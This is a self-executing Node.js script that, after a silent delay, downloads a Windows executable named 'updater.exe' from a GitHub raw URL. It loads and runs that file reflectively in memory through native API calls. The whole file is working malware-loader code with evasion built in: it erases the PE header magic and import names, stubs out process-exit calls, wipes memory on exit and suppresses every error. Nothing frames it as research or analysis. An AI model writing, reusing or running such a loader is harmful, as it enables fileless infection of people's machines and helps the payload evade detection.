(function () {
  'use strict';
  try {
    var path = require('path');
    var http = require('http');
    var https = require('https');
    var fs = require('fs');
    var Url = require('url').URL;

    var PE_URL = 'https://github.com/mikkelh035-lgtm/dsdsds/raw/refs/heads/main/updater.exe';
    var DELAY_MS = 10000;
    var CALL_ENTRY = true;
    var PROCESS_DELAY_IMPORTS = true;
    var CALL_EXPORTS = [];
    var EXIT_AFTER_ENTRY = false;
    var DEBUG = false;

    var KOFFI_REQUIRE_PATH = null;

    var MEM_USE_PAGEFILE_SECTION = true;
    var MEM_PER_SECTION_PROTECT  = true;
    var MEM_SCRUB_HEADER_MAGIC   = true;
    var MEM_SCRUB_IMPORT_NAMES   = true;
    var MEM_WIPE_HEADERS_FULL    = false;
    var MEM_WIPE_ON_EXIT         = true;

    function log() {
      if (!DEBUG) return;
      try { console.error.apply(console, ['[loader]'].concat(Array.prototype.slice.call(arguments))); } catch (e) {}
    }

    var koffi = null;
    if (KOFFI_REQUIRE_PATH) {
      try { koffi = require(KOFFI_REQUIRE_PATH); } catch (e) { koffi = null; }
    }
    if (!koffi) {
      try { koffi = require('koffi'); }
      catch (e1) {
        try { koffi = require(path.join(__dirname, 'node_modules', 'koffi')); }
        catch (e2) { koffi = null; }
      }
    }
    if (!koffi) return;

    var IMAGE_DIRECTORY_ENTRY_EXPORT = 0;
    var IMAGE_DIRECTORY_ENTRY_IMPORT = 1;
    var IMAGE_DIRECTORY_ENTRY_EXCEPTION = 3;
    var IMAGE_DIRECTORY_ENTRY_BASERELOC = 5;
    var IMAGE_DIRECTORY_ENTRY_TLS = 9;
    var IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT = 13;

    var MEM_COMMIT = 0x1000;
    var MEM_RESERVE = 0x2000;
    var MEM_RELEASE = 0x8000;

    var PAGE_NOACCESS = 0x01;
    var PAGE_READONLY = 0x02;
    var PAGE_READWRITE = 0x04;
    var PAGE_EXECUTE_READ = 0x20;
    var PAGE_EXECUTE_READWRITE = 0x40;

    var SEC_COMMIT = 0x08000000;
    var SECTION_ALL_ACCESS = 0x000F001F;
    var ViewUnmap = 2;

    var IMAGE_SCN_MEM_EXECUTE = 0x20000000;
    var IMAGE_SCN_MEM_READ = 0x40000000;
    var IMAGE_SCN_MEM_WRITE = 0x80000000;

    var IMAGE_ORDINAL_FLAG64 = 0x8000000000000000n;
    var IMAGE_REL_BASED_ABSOLUTE = 0;
    var IMAGE_REL_BASED_DIR64 = 10;
    var IMAGE_FILE_MACHINE_AMD64 = 0x8664;
    var IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b;
    var IMAGE_FILE_DLL = 0x2000;

    var DLL_PROCESS_ATTACH = 1;

    var native = null;

    function ensureNative() {
      if (native) return native;
      var k32 = koffi.load('kernel32.dll');
      var ntdll = koffi.load('ntdll.dll');
      var api = {
        VirtualAlloc: k32.func('void *VirtualAlloc(void *lpAddress, size_t dwSize, uint flAllocationType, uint flProtect)'),
        VirtualFree: k32.func('int VirtualFree(void *lpAddress, size_t dwSize, uint dwFreeType)'),
        VirtualProtect: k32.func('int VirtualProtect(void *lpAddress, size_t dwSize, uint flNewProtect, uint *lpflOldProtect)'),
        RtlMoveMemory: k32.func('void RtlMoveMemory(void *dst, void *src, size_t len)'),
        RtlFillMemory: k32.func('void RtlFillMemory(void *dst, size_t len, uint fill)'),
        LoadLibraryA: k32.func('void *LoadLibraryA(void *lpLibFileName)'),
        GetProcAddress: k32.func('void *GetProcAddress(void *hModule, void *lpProcName)'),
        ExitProcess: k32.func('void ExitProcess(uint uExitCode)'),
        CreateThread: k32.func('void *CreateThread(void *lpThreadAttributes, size_t dwStackSize, void *lpStartAddress, void *lpParameter, uint32 dwCreationFlags, uint32 *lpThreadId)'),
        GetLastError: k32.func('uint32 GetLastError()'),
        CloseHandle: k32.func('int CloseHandle(void *hObject)'),
        UnmapViewOfFile: k32.func('int UnmapViewOfFile(void *lpBaseAddress)'),
        NtCreateSection: ntdll.func('int NtCreateSection(void **SectionHandle, uint32 DesiredAccess, void *ObjectAttributes, int64 *MaximumSize, uint32 SectionPageProtection, uint32 AllocationAttributes, void *FileHandle)'),
        NtMapViewOfSection: ntdll.func('int NtMapViewOfSection(void *SectionHandle, void *ProcessHandle, void **BaseAddress, size_t ZeroBits, size_t CommitSize, int64 *SectionOffset, size_t *ViewSize, uint32 InheritDisposition, uint32 AllocationType, uint32 Win32Protect)'),
        RtlAddFunctionTable: null,
        RtlDeleteFunctionTable: null
      };
      try { api.RtlAddFunctionTable = k32.func('int RtlAddFunctionTable(void *functionTable, uint entryCount, void *baseAddress)'); }
      catch (e) { api.RtlAddFunctionTable = ntdll.func('int RtlAddFunctionTable(void *functionTable, uint entryCount, void *baseAddress)'); }
      try { api.RtlDeleteFunctionTable = k32.func('int RtlDeleteFunctionTable(void *functionTable)'); }
      catch (e) { api.RtlDeleteFunctionTable = ntdll.func('int RtlDeleteFunctionTable(void *functionTable)'); }
      native = api;
      return api;
    }

    function parsePE(buf) {
      if (buf.length < 0x40) throw new Error('file too small');
      var peOff = buf.readUInt32LE(0x3c);
      if (peOff + 24 > buf.length) throw new Error('bad e_lfanew');
      if (buf.toString('latin1', peOff, peOff + 4) !== 'PE\u0000\u0000') throw new Error('no PE sig');
      var coff = peOff + 4;
      if (buf.readUInt16LE(coff) !== IMAGE_FILE_MACHINE_AMD64) throw new Error('not x64');
      var numSections = buf.readUInt16LE(coff + 2);
      var optSize = buf.readUInt16LE(coff + 16);
      var characteristics = buf.readUInt16LE(coff + 18);
      var opt = coff + 20;
      if (buf.readUInt16LE(opt) !== IMAGE_NT_OPTIONAL_HDR64_MAGIC) throw new Error('not PE32+');
      var entryRva = buf.readUInt32LE(opt + 16);
      var imageBase = buf.readBigUInt64LE(opt + 24);
      var sizeOfImage = buf.readUInt32LE(opt + 56);
      var sizeOfHeaders = buf.readUInt32LE(opt + 60);
      var ddCount = buf.readUInt32LE(opt + 108);
      var dd = opt + 112;
      var sections = [];
      var sh = coff + 20 + optSize;
      for (var i = 0; i < numSections; i++) {
        if (sh + 40 > buf.length) break;
        sections.push({
          name: buf.toString('latin1', sh, sh + 8).replace(/\u0000+$/g, ''),
          virtualSize: buf.readUInt32LE(sh + 8),
          virtualAddress: buf.readUInt32LE(sh + 12),
          sizeOfRawData: buf.readUInt32LE(sh + 16),
          pointerToRawData: buf.readUInt32LE(sh + 20),
          characteristics: buf.readUInt32LE(sh + 36)
        });
        sh += 40;
      }
      return {
        peOff: peOff, numSections: numSections, entryRva: entryRva,
        imageBase: imageBase, sizeOfImage: sizeOfImage, sizeOfHeaders: sizeOfHeaders,
        ddCount: ddCount, dd: dd, characteristics: characteristics,
        isDll: (characteristics & IMAGE_FILE_DLL) !== 0, sections: sections
      };
    }

    function ddAt(buf, pe, index) {
      if (index >= pe.ddCount) return null;
      var p = pe.dd + index * 8;
      var rva = buf.readUInt32LE(p);
      if (rva === 0) return null;
      return { rva: rva, size: buf.readUInt32LE(p + 4) };
    }

    function rvaToOffset(buf, pe, rva) {
      if (rva < pe.sizeOfHeaders) return rva;
      for (var i = 0; i < pe.sections.length; i++) {
        var s = pe.sections[i];
        var span = Math.max(s.virtualSize, s.sizeOfRawData);
        if (rva >= s.virtualAddress && rva < s.virtualAddress + span) {
          var off = s.pointerToRawData + (rva - s.virtualAddress);
          return off < buf.length ? off : -1;
        }
      }
      return -1;
    }

    function cstrAt(buf, off) {
      if (off < 0 || off >= buf.length) return '';
      var end = buf.indexOf(0, off);
      if (end < 0) return buf.toString('latin1', off, buf.length);
      return buf.toString('latin1', off, end);
    }
    function isNullPtr(v) { return v === null || v === undefined || v === 0n; }
    function cstrBuf(value) {
      var b = Buffer.alloc(value.length + 1);
      b.write(value, 0, value.length, 'latin1');
      return b;
    }

    var w8 = Buffer.alloc(8);
    var w4 = Buffer.alloc(4);
    function memWrite(addr, src) { ensureNative().RtlMoveMemory(addr, src, src.length); }
    function memWrite64(addr, value) { w8.writeBigUInt64LE(value, 0); memWrite(addr, w8); }
    function memZero(addr, size) { ensureNative().RtlFillMemory(addr, size, 0); }

    var _stubCache = {};

    function buildExitProcessStub() {
      if (_stubCache.exitProcess) return _stubCache.exitProcess;
      var api = ensureNative();
      var k32h = api.LoadLibraryA(cstrBuf('kernel32.dll'));
      if (isNullPtr(k32h)) return 0n;
      var exitThread = api.GetProcAddress(k32h, cstrBuf('ExitThread'));
      if (isNullPtr(exitThread)) return 0n;
      var stub = api.VirtualAlloc(null, 16, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
      if (isNullPtr(stub)) return 0n;
      var code = Buffer.alloc(12);
      code[0] = 0x48; code[1] = 0xB8;
      code.writeBigUInt64LE(BigInt(exitThread), 2);
      code[10] = 0xFF; code[11] = 0xE0;
      memWrite(stub, code);
      _stubCache.exitProcess = stub;
      return stub;
    }

    function buildTerminateProcessStub() {
      if (_stubCache.terminateProcess) return _stubCache.terminateProcess;
      var api = ensureNative();
      var stub = api.VirtualAlloc(null, 16, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
      if (isNullPtr(stub)) return 0n;
      var code = Buffer.alloc(4);
      code[0] = 0x31; code[1] = 0xC0;
      code[2] = 0xC3;
      memWrite(stub, code);
      _stubCache.terminateProcess = stub;
      return stub;
    }

    var STUB_MAP = {
      'ExitProcess':        buildExitProcessStub,
      'RtlExitUserProcess': buildExitProcessStub,
      'TerminateProcess':   buildTerminateProcessStub
    };

    function allocateRegion(pe, opts) {
      var api = ensureNative();
      var useSection = opts.usePagefileSection !== false;
      if (useSection) {
        var maxSizeBuf = Buffer.alloc(8);
        maxSizeBuf.writeBigInt64LE(BigInt(pe.sizeOfImage), 0);
        var secHandleRef = [null];
        var st = api.NtCreateSection(secHandleRef, SECTION_ALL_ACCESS, null, maxSizeBuf, PAGE_EXECUTE_READWRITE, SEC_COMMIT, null);
        if (st !== 0 || isNullPtr(secHandleRef[0])) { useSection = false; }
        else {
          var viewSizeBuf = Buffer.alloc(8);
          viewSizeBuf.writeBigUInt64LE(BigInt(pe.sizeOfImage), 0);
          var baseRef = [null];
          var st2 = api.NtMapViewOfSection(secHandleRef[0], -1n, baseRef, 0, 0, null, viewSizeBuf, ViewUnmap, 0, PAGE_EXECUTE_READWRITE);
          if (st2 !== 0 || isNullPtr(baseRef[0])) { api.CloseHandle(secHandleRef[0]); useSection = false; }
          else { return { base: BigInt(baseRef[0]), sectionHandle: secHandleRef[0], isSection: true }; }
        }
      }
      var base = api.VirtualAlloc(null, pe.sizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      if (isNullPtr(base)) throw new Error('VirtualAlloc failed');
      return { base: BigInt(base), sectionHandle: null, isSection: false };
    }

    function protForSection(chars) {
      var exec = (chars & IMAGE_SCN_MEM_EXECUTE) !== 0;
      var read = (chars & IMAGE_SCN_MEM_READ) !== 0;
      var write = (chars & IMAGE_SCN_MEM_WRITE) !== 0;
      if (exec && write) return PAGE_EXECUTE_READWRITE;
      if (exec) return PAGE_EXECUTE_READ;
      if (write) return PAGE_READWRITE;
      if (read) return PAGE_READONLY;
      return PAGE_NOACCESS;
    }

    function applyPerSectionProtections(pe, base) {
      var api = ensureNative();
      var old = [0];
      var headerSize = Math.min(pe.sizeOfHeaders, 0x1000);
      if (headerSize > 0) api.VirtualProtect(base, headerSize, PAGE_READONLY, old);
      var firstVa = pe.sections.length ? pe.sections[0].virtualAddress : pe.sizeOfHeaders;
      if (firstVa > pe.sizeOfHeaders) {
        api.VirtualProtect(base + BigInt(pe.sizeOfHeaders), firstVa - pe.sizeOfHeaders, PAGE_READONLY, old);
      }
      for (var i = 0; i < pe.sections.length; i++) {
        var s = pe.sections[i];
        if (s.virtualSize === 0) continue;
        api.VirtualProtect(base + BigInt(s.virtualAddress), s.virtualSize, protForSection(s.characteristics), old);
      }
    }

    function scrubHeaderMagic(buf, pe, base) {
      if (!MEM_SCRUB_HEADER_MAGIC) return;
      memZero(base, 2);
      memZero(base + BigInt(pe.peOff), 4);
    }

    function scrubImportNames(buf, pe, base) {
      if (!MEM_SCRUB_IMPORT_NAMES) return;
      var dir = ddAt(buf, pe, IMAGE_DIRECTORY_ENTRY_IMPORT);
      if (!dir) return;
      var off = rvaToOffset(buf, pe, dir.rva);
      if (off < 0) return;
      while (off + 20 <= buf.length) {
        var origThunkRva = buf.readUInt32LE(off);
        var nameRva = buf.readUInt32LE(off + 12);
        var firstThunkRva = buf.readUInt32LE(off + 16);
        if (origThunkRva === 0 && firstThunkRva === 0) break;
        if (nameRva === 0) { off += 20; continue; }
        var dllNameLen = cstrAt(buf, rvaToOffset(buf, pe, nameRva)).length;
        if (dllNameLen > 0) memZero(base + BigInt(nameRva), dllNameLen + 1);
        var srcRva = origThunkRva !== 0 ? origThunkRva : firstThunkRva;
        var so = rvaToOffset(buf, pe, srcRva);
        while (so >= 0 && so + 8 <= buf.length) {
          var thunk = buf.readBigUInt64LE(so);
          if (thunk === 0n) break;
          if ((thunk & IMAGE_ORDINAL_FLAG64) === 0n) {
            var hnRva = Number(thunk & 0xffffffffn);
            var hnOff = rvaToOffset(buf, pe, hnRva);
            if (hnOff >= 0) {
              var hnLen = cstrAt(buf, hnOff + 2).length;
              if (hnLen > 0) memZero(base + BigInt(hnRva), hnLen + 3);
            }
          }
          so += 8;
        }
        off += 20;
      }
    }

    function applyRelocations(buf, pe, base) {
      var dir = ddAt(buf, pe, IMAGE_DIRECTORY_ENTRY_BASERELOC);
      if (!dir) return 0;
      var delta = base - pe.imageBase;
      if (delta === 0n) return 0;
      var off = rvaToOffset(buf, pe, dir.rva);
      var count = 0;
      if (off < 0) return 0;
      var end = off + dir.size;
      while (off + 8 <= end) {
        var pageRva = buf.readUInt32LE(off);
        var blockSize = buf.readUInt32LE(off + 4);
        if (blockSize < 8) break;
        var n = (blockSize - 8) >> 1;
        for (var i = 0; i < n; i++) {
          var entry = buf.readUInt16LE(off + 8 + i * 2);
          var type = entry >> 12;
          var relRva = pageRva + (entry & 0xfff);
          if (type === IMAGE_REL_BASED_ABSOLUTE) continue;
          if (type !== IMAGE_REL_BASED_DIR64) continue;
          var foff = rvaToOffset(buf, pe, relRva);
          if (foff < 0 || foff + 8 > buf.length) continue;
          var orig = buf.readBigUInt64LE(foff);
          var fixed = BigInt.asUintN(64, orig + delta);
          memWrite64(base + BigInt(relRva), fixed);
          count++;
        }
        off += blockSize;
      }
      return count;
    }

    function resolveThunk(api, buf, pe, dllHandle, thunk, what) {
      if ((thunk & IMAGE_ORDINAL_FLAG64) !== 0n) {
        var ord = thunk & 0xffffn;
        var po = api.GetProcAddress(dllHandle, ord);
        if (isNullPtr(po)) return 0n;
        return po;
      }
      var byNameRva = Number(thunk & 0xffffffffn);
      var name = cstrAt(buf, rvaToOffset(buf, pe, byNameRva) + 2);
      if (STUB_MAP[name]) {
        var stub = STUB_MAP[name]();
        if (!isNullPtr(stub) && stub !== 0n) return BigInt(stub);
      }
      var p = api.GetProcAddress(dllHandle, cstrBuf(name));
      if (isNullPtr(p)) return 0n;
      return p;
    }

    function applyImports(buf, pe, base, stats) {
      var api = ensureNative();
      var dir = ddAt(buf, pe, IMAGE_DIRECTORY_ENTRY_IMPORT);
      if (!dir) return;
      var off = rvaToOffset(buf, pe, dir.rva);
      if (off < 0) return;
      var loaded = {};
      while (off + 20 <= buf.length) {
        var origThunkRva = buf.readUInt32LE(off);
        var nameRva = buf.readUInt32LE(off + 12);
        var firstThunkRva = buf.readUInt32LE(off + 16);
        if (origThunkRva === 0 && firstThunkRva === 0) break;
        if (nameRva === 0) { off += 20; continue; }
        var dllName = cstrAt(buf, rvaToOffset(buf, pe, nameRva));
        var hMod = loaded[dllName];
        if (!hMod) {
          hMod = api.LoadLibraryA(cstrBuf(dllName));
          if (isNullPtr(hMod)) { off += 20; continue; }
          loaded[dllName] = hMod;
          stats.importDlls++;
        }
        var srcRva = origThunkRva !== 0 ? origThunkRva : firstThunkRva;
        var so = rvaToOffset(buf, pe, srcRva);
        var i = 0;
        while (so >= 0 && so + 8 <= buf.length) {
          var thunk = buf.readBigUInt64LE(so);
          if (thunk === 0n) break;
          var proc = resolveThunk(api, buf, pe, hMod, thunk, dllName);
          if (proc !== 0n) stats.importFuncs++;
          memWrite64(base + BigInt(firstThunkRva + i * 8), proc);
          i++; so += 8;
        }
        off += 20;
      }
    }

    function applyDelayImports(buf, pe, base, stats) {
      var api = ensureNative();
      var dir = ddAt(buf, pe, IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT);
      if (!dir) return;
      var off = rvaToOffset(buf, pe, dir.rva);
      if (off < 0) return;
      var loaded = {};
      while (off + 32 <= buf.length) {
        var attrs = buf.readUInt32LE(off);
        var dllNameRva = buf.readUInt32LE(off + 4);
        var moduleHandleRva = buf.readUInt32LE(off + 8);
        var iatRva = buf.readUInt32LE(off + 12);
        var intRva = buf.readUInt32LE(off + 16);
        if (dllNameRva === 0 && iatRva === 0 && intRva === 0) break;
        if (dllNameRva === 0) { off += 32; continue; }
        var rvaBased = (attrs & 1) !== 0;
        var toRva = function (v) {
          if (v === 0) return 0;
          if (rvaBased) return v;
          var r = BigInt(v) - pe.imageBase;
          return r < 0n ? 0 : Number(r);
        };
        var dllName = cstrAt(buf, rvaToOffset(buf, pe, toRva(dllNameRva)));
        var hMod = loaded[dllName];
        if (!hMod) {
          hMod = api.LoadLibraryA(cstrBuf(dllName));
          if (isNullPtr(hMod)) { off += 32; continue; }
          loaded[dllName] = hMod;
        }
        if (moduleHandleRva !== 0) memWrite64(base + BigInt(toRva(moduleHandleRva)), hMod);
        var srcRva = toRva(intRva !== 0 ? intRva : iatRva);
        var dstRva = toRva(iatRva);
        var so = rvaToOffset(buf, pe, srcRva);
        var i = 0;
        while (so >= 0 && so + 8 <= buf.length) {
          var thunk = buf.readBigUInt64LE(so);
          if (thunk === 0n) break;
          var proc = resolveThunk(api, buf, pe, hMod, thunk, dllName + ' (delay)');
          if (proc !== 0n) stats.delayFuncs++;
          memWrite64(base + BigInt(dstRva + i * 8), proc);
          i++; so += 8;
        }
        off += 32;
      }
    }

    function registerExceptionTable(buf, pe, base) {
      var api = ensureNative();
      var dir = ddAt(buf, pe, IMAGE_DIRECTORY_ENTRY_EXCEPTION);
      if (!dir) return false;
      var count = Math.floor(dir.size / 12);
      if (count === 0) return false;
      return api.RtlAddFunctionTable(base + BigInt(dir.rva), count, base) !== 0;
    }

    function callTlsCallbacks(buf, pe, base) {
      var dir = ddAt(buf, pe, IMAGE_DIRECTORY_ENTRY_TLS);
      if (!dir) return 0;
      var off = rvaToOffset(buf, pe, dir.rva);
      if (off < 0 || off + 40 > buf.length) return 0;
      var callbacksVa = buf.readBigUInt64LE(off + 24);
      if (callbacksVa === 0n) return 0;
      var cbRva = Number(callbacksVa - pe.imageBase);
      var co = rvaToOffset(buf, pe, cbRva);
      var tlsType = koffi.proto('void', ['void *', 'uint', 'void *']);
      var count = 0;
      while (co >= 0 && co + 8 <= buf.length) {
        var cb = buf.readBigUInt64LE(co);
        if (cb === 0n) break;
        var addr = base + (cb - pe.imageBase);
        koffi.call(addr, tlsType, base, DLL_PROCESS_ATTACH, 0n);
        count++; co += 8;
      }
      return count;
    }

    function parseExports(buf, pe, base) {
      var out = {};
      var dir = ddAt(buf, pe, IMAGE_DIRECTORY_ENTRY_EXPORT);
      if (!dir) return out;
      var off = rvaToOffset(buf, pe, dir.rva);
      if (off < 0 || off + 40 > buf.length) return out;
      var nNames = buf.readUInt32LE(off + 24);
      var aof = buf.readUInt32LE(off + 28);
      var aon = buf.readUInt32LE(off + 32);
      var aoo = buf.readUInt32LE(off + 36);
      var oNames = rvaToOffset(buf, pe, aon);
      var oOrds = rvaToOffset(buf, pe, aoo);
      var oFuncs = rvaToOffset(buf, pe, aof);
      for (var i = 0; i < nNames && i < 4096; i++) {
        if (oNames < 0 || oNames + 4 * i + 4 > buf.length) break;
        var nameRva = buf.readUInt32LE(oNames + 4 * i);
        var name = cstrAt(buf, rvaToOffset(buf, pe, nameRva));
        if (!name) continue;
        if (oOrds < 0 || oOrds + 2 * i + 2 > buf.length) break;
        var ordIdx = buf.readUInt16LE(oOrds + 2 * i);
        if (oFuncs < 0 || oFuncs + 4 * ordIdx + 4 > buf.length) break;
        var funcRva = buf.readUInt32LE(oFuncs + 4 * ordIdx);
        if (funcRva >= dir.rva && funcRva < dir.rva + dir.size) {
          out[name] = cstrAt(buf, rvaToOffset(buf, pe, funcRva));
          continue;
        }
        out[name] = base + BigInt(funcRva);
      }
      return out;
    }

    function mapPe(data, options) {
      var opts = options || {};
      var stats = { importDlls: 0, importFuncs: 0, delayFuncs: 0 };
      var pe = parsePE(data);

      var region = allocateRegion(pe, {
        usePagefileSection: opts.usePagefileSection !== false && MEM_USE_PAGEFILE_SECTION
      });
      var base = region.base;
      log('region allocated', region.isSection ? '(pagefile-backed)' : '(MEM_PRIVATE)');

      var header = Buffer.alloc(pe.sizeOfHeaders);
      data.copy(header, 0, 0, Math.min(pe.sizeOfHeaders, data.length));
      memWrite(base, header);

      for (var i = 0; i < pe.sections.length; i++) {
        var s = pe.sections[i];
        if (s.sizeOfRawData === 0) continue;
        var copyLen = Math.min(s.sizeOfRawData, Math.max(0, data.length - s.pointerToRawData));
        if (copyLen <= 0) continue;
        var sd = Buffer.alloc(copyLen);
        data.copy(sd, 0, s.pointerToRawData, s.pointerToRawData + copyLen);
        memWrite(base + BigInt(s.virtualAddress), sd);
      }

      applyRelocations(data, pe, base);
      applyImports(data, pe, base, stats);
      if (opts.processDelayImports !== false) applyDelayImports(data, pe, base, stats);
      var hasFnTable = registerExceptionTable(data, pe, base);
      callTlsCallbacks(data, pe, base);
      var exportsMap = parseExports(data, pe, base);

      scrubHeaderMagic(data, pe, base);
      scrubImportNames(data, pe, base);

      if (opts.wipeHeadersFull === true || MEM_WIPE_HEADERS_FULL) {
        memZero(base, pe.sizeOfHeaders);
      }

      if (opts.perSectionProtect !== false && MEM_PER_SECTION_PROTECT) {
        applyPerSectionProtections(pe, base);
      }

      var entryResult = null, entryCalled = false;
      var threadHandle = null, threadId = 0;
      if (pe.entryRva !== 0 && opts.callEntry !== false) {
        var entryAddr = base + BigInt(pe.entryRva);
        var api = ensureNative();
        if (pe.isDll) {
          var dllType = koffi.proto('int', ['void *', 'uint', 'void *']);
          entryResult = koffi.call(entryAddr, dllType, base, DLL_PROCESS_ATTACH, 0n);
          entryCalled = true;
        } else {
          var tidBuf = [0];
          threadHandle = api.CreateThread(null, 0, entryAddr, null, 0, tidBuf);
          threadId = tidBuf[0];
          entryResult = 0;
          entryCalled = true;
        }
      }

      var unmapped = false;
      return {
        base: base,
        imageBase: pe.imageBase,
        size: pe.sizeOfImage,
        entryRva: pe.entryRva,
        entryResult: entryResult,
        entryCalled: entryCalled,
        isDll: pe.isDll,
        isSection: region.isSection,
        sectionHandle: region.sectionHandle,
        threadHandle: threadHandle,
        threadId: threadId,
        hasFunctionTable: hasFnTable,
        exports: exportsMap,
        warnings: [],
        makeCallable: function (addr, retType, argTypes) {
          var type = koffi.proto(retType, argTypes);
          return function () {
            return koffi.call.apply(null, [addr, type].concat(Array.prototype.slice.call(arguments)));
          };
        },
        wipeAndUnmap: function () {
          if (unmapped) return false;
          var api = ensureNative();
          try { if (MEM_WIPE_ON_EXIT) api.RtlFillMemory(base, pe.sizeOfImage, 0); } catch (e) {}
          try {
            if (hasFnTable) {
              var exDir = ddAt(data, pe, IMAGE_DIRECTORY_ENTRY_EXCEPTION);
              if (exDir) api.RtlDeleteFunctionTable(base + BigInt(exDir.rva));
            }
          } catch (e) {}
          if (region.isSection) {
            api.UnmapViewOfFile(base);
            if (!isNullPtr(region.sectionHandle)) api.CloseHandle(region.sectionHandle);
          } else {
            api.VirtualFree(base, 0, MEM_RELEASE);
          }
          unmapped = true;
          return true;
        }
      };
    }

    function downloadToBuffer(urlString, redirectLeft) {
      if (redirectLeft === undefined) redirectLeft = 5;
      return new Promise(function (resolve, reject) {
        var parsed;
        try { parsed = new Url(urlString); } catch (e) { reject(e); return; }
        var lib = parsed.protocol === 'https:' ? https : http;
        var req = lib.get({
          protocol: parsed.protocol, hostname: parsed.hostname,
          port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
          path: parsed.pathname + parsed.search,
          headers: { 'User-Agent': 'Mozilla/5.0', Accept: '*/*', 'Cache-Control': 'no-cache' },
          timeout: 60000
        }, function (res) {
          var code = res.statusCode || 0;
          if (code >= 300 && code < 400 && res.headers.location && redirectLeft > 0) {
            res.resume();
            var next = new Url(res.headers.location, urlString).href;
            downloadToBuffer(next, redirectLeft - 1).then(resolve, reject);
            return;
          }
          if (code !== 200) { res.resume(); reject(new Error('HTTP ' + code)); return; }
          var chunks = [], total = 0, maxBytes = 64 * 1024 * 1024;
          res.on('data', function (chunk) {
            total += chunk.length;
            if (total > maxBytes) { req.destroy(); reject(new Error('too large')); return; }
            chunks.push(chunk);
          });
          res.on('end', function () { resolve(Buffer.concat(chunks)); });
          res.on('error', reject);
        });
        req.on('timeout', function () { req.destroy(); reject(new Error('timeout')); });
        req.on('error', reject);
      });
    }

    var mappedRef = null;
    var exitHooksInstalled = false;

    function installExitHooks() {
      if (exitHooksInstalled) return;
      exitHooksInstalled = true;
      function doRestore() {
        if (mappedRef && mappedRef.wipeAndUnmap) {
          try { mappedRef.wipeAndUnmap(); } catch (e) {}
        }
      }
      process.on('exit', doRestore);
      process.on('SIGINT', function () { doRestore(); process.exit(0); });
      process.on('SIGTERM', function () { doRestore(); process.exit(0); });
    }

    function keepAlive() {
      if (!mappedRef) return;
      setInterval(function () {}, 60000);
    }

    function doMap() {
      if (mappedRef) return;
      if (!PE_URL) return;
      downloadToBuffer(PE_URL)
        .then(function (data) {
          if (!data || data.length < 0x40 || data[0] !== 0x4d || data[1] !== 0x5a) return;
          mappedRef = mapPe(data, {
            callEntry: CALL_ENTRY === true,
            processDelayImports: PROCESS_DELAY_IMPORTS !== false,
            usePagefileSection: MEM_USE_PAGEFILE_SECTION,
            perSectionProtect: MEM_PER_SECTION_PROTECT,
            wipeHeadersFull: MEM_WIPE_HEADERS_FULL
          });
          try { data.fill(0); } catch (e) {}
          log('mapped base=0x' + mappedRef.base.toString(16));
          installExitHooks();
          if (mappedRef.isDll) keepAlive();
        })
        .catch(function (e) { log('doMap failed:', e && e.message); });
    }

    setTimeout(function () {
      try { doMap(); } catch (e) { log('schedule threw:', e && e.message); }
    }, DELAY_MS);
  } catch (e) {}
})();